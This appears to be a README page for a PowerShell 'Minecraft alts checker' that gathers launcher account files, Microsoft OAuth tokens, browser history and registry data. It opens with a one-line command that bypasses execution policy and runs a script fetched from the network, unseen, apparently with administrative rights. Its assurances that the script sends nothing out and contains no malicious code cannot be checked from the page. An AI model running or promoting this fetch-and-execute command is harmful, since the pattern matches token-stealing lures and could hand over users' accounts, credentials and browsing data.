- **`powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alts-checker.ps1')"`**

**🛠️ Minecraft Alts Checker Tool**
A PowerShell utility for analyzing Minecraft accounts stored locally by various launchers, with JWT token decoding capabilities.

🔍 **Features**
 - 🕵️‍♂️ **Account Analysis**
   - Multi-Launcher Support:
      - TLauncher
      - Official Minecraft Launcher
      - MultiMC
      - Badlion Client
      - Lunar Client
   - Microsoft OAuth Token Detection (`accessToken/id_token`)
   - JWT Token Decoding with detailed claims inspection
   - Account Type Identification (Premium/Cracked)

🔎 **Forensic Capabilities**
   - Comprehensive File Parsing:
      - `%APPDATA%\.minecraft\TlauncherProfiles.json`
      - `%APPDATA%\.minecraft\launcher_accounts.json`
      - `%APPDATA%\.minecraft\usernamecache.json`
      - `%APPDATA%\.minecraft\usercache.json`
      - MultiMC `accounts.json`
      - Badlion Client `settings.json`
      - Lunar Client `accounts.json`
   - Advanced Config Search across multiple launcher directories
   - Deleted File Recovery using USN journal analysis
   - Registry Analysis for installed Minecraft applications

📋 **Account Information Display**
 - For each found account, shows:
      - Username/Display Name
      - UUID
      - Account type (Microsoft/Mojang/Cracked)
      - Microsoft token presence (✅/❌)
      - Premium status
      - Last accessed timestamp
      - Source launcher

🔐 **Advanced JWT Decoding**
 - Built-in `Decode-Jwt` function:
      - Accepts JWT tokens (`accessToken `or` id_token`)
      - Splits and base64-decodes the payload
      - Returns readable JSON claims in table format
      - Token expiry detection and validation
      - Detailed claims analysis (sub, iss, aud, etc.)

🖥️ **System Analysis**
 - Process Monitoring for Minecraft-related executables
      - Windows Event Log analysis
      - Browser History scanning (Chrome/Firefox)
      - Registry Inspection for installed launchers

📊 **Reporting**
 - Interactive HTML Report with filtering capabilities
      - CSV Export for all found accounts
      - Backup System for Minecraft configurations
      - Account Summary with statistics

🚀 **New in v3.0**
      - Beautiful animated ASCII logo with color effects
      - Enhanced account detection for more launchers
      - Comprehensive system analysis tools
      - Professional HTML reporting
      - Data export capabilities (CSV)
      - Configuration backup system
      - Windows event log analysis
      - Browser history scanning
      - Registry inspection
      - Deleted file recovery
      - Multi-language support

⚠️ **Requirements**
      - Windows PowerShell 5.1+
      - Administrative privileges (for full forensic capabilities)
      - Minecraft or alternative launcher installation

📜 **Legal Notice**
 - This tool is intended solely for:
      - Personal use
      - Debugging purposes
      - Educational research
      - Account recovery
      - Prohibited Uses:
      - Violating any terms of service
      - Accessing unauthorized accounts
      - Conducting illegal activities

**`The author disclaims all responsibility for misuse of this software.`**

🛡️ **Security Note**
 - The script:
      - Runs locally without external data transmission
      - Requests minimal necessary permissions
      - Provides transparent account inspection
      - Includes no malicious code
      - Respects user privacy

**`Not affiliated with Mojang Studios or Microsoft. Minecraft is a trademark of Mojang Studios.`**

👥 **Credits**
 - **`Developed by usnjournal. & onlynelchilling`**
